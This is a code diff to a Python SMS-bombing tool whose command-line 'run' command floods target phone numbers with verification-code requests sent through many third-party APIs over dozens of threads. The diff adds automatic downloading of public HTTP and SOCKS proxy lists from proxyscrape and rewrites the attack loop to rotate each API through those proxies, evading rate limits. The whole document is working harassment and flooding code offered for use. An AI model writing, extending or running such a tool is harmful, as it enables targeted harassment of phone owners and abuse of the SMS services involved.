@@ -4,7 +4,7 @@
 from utils import default_header_user_agent
 from utils.log import logger
 from utils.models import API
-from utils.req import reqFunc, reqFuncByProxy, runAsync
+from utils.req import reqFunc, reqFuncByProxy, runAsync, zyh_reqFuncByProxy
 from concurrent.futures import ThreadPoolExecutor
 from typing import List, Union
 import asyncio
@@ -15,6 +15,9 @@ import time
 import click
 import httpx
 import os
+import random
+import wget
+import global_v
 
 # 確定應用程序係一個腳本文件或凍結EXE
 if getattr(sys, 'frozen', False):
@@ -23,12 +26,36 @@ elif __file__:
     path = os.path.dirname(__file__)
 
 
+def download_proxies():
+    f_name = 'http_proxies.txt'
+    url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
+    if os.path.exists(f_name):
+        os.remove(f_name)
+    wget.download(url, f_name, bar=None)
+    logger.success(f"http_proxies downloaded")
+
+    f_name = 'socks4_proxies.txt'
+    url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all'
+    if os.path.exists(f_name):
+        os.remove(f_name)
+    wget.download(url, f_name, bar=None)    
+    logger.success(f"socks4_proxies downloaded")
+
+    f_name = 'socks5_proxies.txt'
+    url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all'
+    if os.path.exists(f_name):
+        os.remove(f_name)
+    wget.download(url, f_name, bar=None)
+    logger.success(f"socks5_proxies downloaded")
+
+
 def load_proxies() -> list:
     """load proxies for files
     :return: proxies list
     """
+    download_proxies()
     proxy_all = []
-    proxy_file = ["http_proxy.txt", "socks5_proxy.txt", "socks4_proxy.txt"]
+    proxy_file = ["http_proxies.txt", "socks5_proxies.txt", "socks4_proxies.txt"]
     for fn in proxy_file:
         f_obj = pathlib.Path(path, fn)
         if f_obj.exists():
@@ -36,15 +63,15 @@ def load_proxies() -> list:
                 encoding="utf8").split("\n")
             if not proxy_lst:
                 continue
-            if fn == "http_proxy.txt":
+            if fn == "http_proxies.txt":
                 for proxy in proxy_lst:
                     if proxy:
                         proxy_all.append({'all://': 'http://' + proxy})
-            elif fn == "socks5_proxy.txt":
+            elif fn == "socks5_proxies.txt":
                 for proxy in proxy_lst:
                     if proxy:
                         proxy_all.append({'all://': 'socks5://' + proxy})
-            elif fn == "socks4_proxy.txt":
+            elif fn == "socks4_proxies.txt":
                 for proxy in proxy_lst:
                     if proxy:
                         proxy_all.append({'all://': 'socks4://' + proxy})
@@ -100,43 +127,77 @@ def load_getapi() -> list:
 @click.option("--thread", "-t", help="线程数(默认64)", default=64)
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
 @click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
-@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
+@click.option('--interval', "-i", default=9791, help="间隔时间(默认60s)", type=int)
 @click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
 def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
     """传入线程数和手机号启动轰炸,支持多手机号"""
-    logger.info(
-        f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
-    try:
-        _api = load_json()
-        _api_get = load_getapi()
-        _proxies = load_proxies()
-        # fix: by Ethan
-        if not _proxies:
-            if enable_proxy:
-                logger.error("无法读取任何代理....请取消-e")
-                sys.exit(1)
-            _proxies = [None]
-    except ValueError:
-        logger.error("读取接口出错!正在重新下载接口数据!....")
-        update()
-        sys.exit(1)
+    for i in range(1, frequency + 1):
+        logger.info(
+            f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
+        try:
+            _api = load_json()
+            _api_get = load_getapi()
+            _proxies = load_proxies()
+            # _proxies = _proxies
+            # fix: by Ethan
+            if not _proxies:
+                if enable_proxy:
+                    logger.error("无法读取任何代理....请取消-e")
+                    sys.exit(1)
+                _proxies = [None]
+        except ValueError:
+            logger.error("读取接口出错!正在重新下载接口数据!....")
+            update()
+            sys.exit(1)
 
-    with ThreadPoolExecutor(max_workers=thread) as pool:
-        for i in range(1, frequency + 1):
-            logger.success(f"第{i}波轰炸开始！")
-            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
-            for proxy in _proxies:
-                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
-                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
-                # 不可用的代理或API过多可能会影响轰炸效果
+        
+        logger.success(f"第{i}波轰炸开始！")
+
+        if enable_proxy:
+        # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
+            for api in _api:
+                global_v.flag = False
+                logger.success(f"第{i}波轰炸 - 当前正在使用代理 - app: {api.desc} - thread: {thread}")
+                with ThreadPoolExecutor(max_workers=thread) as pool:
+                    for proxy in _proxies:
+                        if not global_v.flag:
+                            # logger.success(f"第{i}波轰炸 - 当前正在使用代理：" + proxy['all://'] + " 进行轰炸...")
+                            # 不可用的代理或API过多可能会影响轰炸效果
+                            pool.submit(zyh_reqFuncByProxy, api, phone, proxy)
+                
+                if global_v.flag:
+                    logger.success('SUCCESS!!!!')
+                else: 
+                    logger.error('FAIL!!!!')
+        else:
+            with ThreadPoolExecutor(max_workers=thread) as pool:
                 for api in _api:
-                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
-                        reqFunc, api, phone)
-                for api_get in _api_get:
-                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
-                        reqFunc, api_get, phone)
-                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
-                time.sleep(interval)
+                    logger.success(f"第{i}波开始轰炸...")
+                    pool.submit(reqFunc, api, phone)
+
+        # if enable_proxy:
+        # # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
+        #     for api_get in _api_get:
+        #         global_v.flag = False
+        #         logger.success(f"第{i}波轰炸 - 当前正在使用代理 - thread: {thread}")
+        #         with ThreadPoolExecutor(max_workers=thread) as pool:
+        #             for proxy in _proxies:
+        #                 if not global_v.flag:
+        #                     # logger.success(f"第{i}波轰炸 - 当前正在使用代理：" + proxy['all://'] + " 进行轰炸...")
+        #                     # 不可用的代理或API过多可能会影响轰炸效果
+        #                     pool.submit(zyh_reqFuncByProxy, api_get, phone, proxy)
+                
+        #         if global_v.flag:
+        #             logger.success('SUCCESS!!!!')
+        #         else: 
+        #             logger.error('FAIL!!!!')
+        # else:
+        #     with ThreadPoolExecutor(max_workers=thread) as pool:
+        #         for api_get in _api_get:
+        #             logger.success(f"第{i}波开始轰炸...")
+        #             pool.submit(reqFunc, api_get, phone)
+        if interval != 9791:
+            time.sleep(interval)    
 
 
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
